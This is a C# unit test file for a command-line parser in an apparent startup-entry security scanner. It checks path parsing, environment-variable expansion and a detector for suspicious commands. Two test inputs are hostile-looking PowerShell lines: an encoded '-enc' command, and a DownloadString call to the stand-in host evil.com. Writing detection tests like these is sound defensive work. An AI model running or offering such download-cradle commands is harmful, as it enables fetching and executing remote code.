using FluentAssertions;
using Xunit;
using BootSentry.Core.Parsing;

namespace BootSentry.Core.Tests.Parsing;

public class CommandLineParserTests
{
    [Fact]
    public void Parse_WithNullInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse(null);
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithEmptyInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse("");
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithWhitespaceInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse("   ");
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithQuotedPath_ExtractsExecutableAndArguments()
    {
        var result = CommandLineParser.Parse("\"C:\\Program Files\\App\\app.exe\" --arg1 --arg2");

        result.Should().NotBeNull();
        result!.Executable.Should().Be("C:\\Program Files\\App\\app.exe");
        result.Arguments.Should().Be("--arg1 --arg2");
    }

    [Fact]
    public void Parse_WithSimplePath_ExtractsExecutable()
    {
        var result = CommandLineParser.Parse("C:\\Windows\\notepad.exe");

        result.Should().NotBeNull();
        result!.Raw.Should().Be("C:\\Windows\\notepad.exe");
    }

    [Fact]
    public void Parse_WithEnvironmentVariable_ExpandsVariable()
    {
        var result = CommandLineParser.Parse("%SystemRoot%\\notepad.exe");

        result.Should().NotBeNull();
        result!.Normalized.ToLowerInvariant().Should().Contain("windows");
        result.Normalized.Should().NotContain("%SystemRoot%");
    }

    [Fact]
    public void Parse_WithEnvironmentVariableDisabled_DoesNotExpand()
    {
        var result = CommandLineParser.Parse("%SystemRoot%\\notepad.exe", expandEnvironmentVariables: false);

        result.Should().NotBeNull();
        result!.Normalized.Should().Contain("%SystemRoot%");
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithEncodedPowerShell_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -enc SGVsbG8gV29ybGQ=");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithDownloadString_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -c \"(New-Object Net.WebClient).DownloadString('http://evil.com')\"");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithNormalCommand_ReturnsFalse()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "\"C:\\Program Files\\App\\app.exe\" --startup");

        suspicious.Should().BeFalse();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithNull_ReturnsFalse()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(null);
        suspicious.Should().BeFalse();
    }

    [Fact]
    public void ExpandEnvironmentVariables_WithSystemRoot_ExpandsCorrectly()
    {
        var result = CommandLineParser.ExpandEnvironmentVariables("%SystemRoot%");
        result.Should().NotContain("%");
        result.ToLowerInvariant().Should().Contain("windows");
    }

    [Fact]
    public void ResolvePath_WithNullInput_ReturnsNull()
    {
        var result = CommandLineParser.ResolvePath(null);
        result.Should().BeNull();
    }

    [Fact]
    public void ResolvePath_WithAbsolutePath_ReturnsSamePath()
    {
        var path = "C:\\Windows\\notepad.exe";
        var result = CommandLineParser.ResolvePath(path);
        result.Should().Be(path);
    }

    [Fact]
    public void ResolvePath_WithEnvironmentVariable_Expands()
    {
        var result = CommandLineParser.ResolvePath("%SystemRoot%\\notepad.exe");
        result.Should().NotBeNull();
        result.Should().NotContain("%");
    }
}
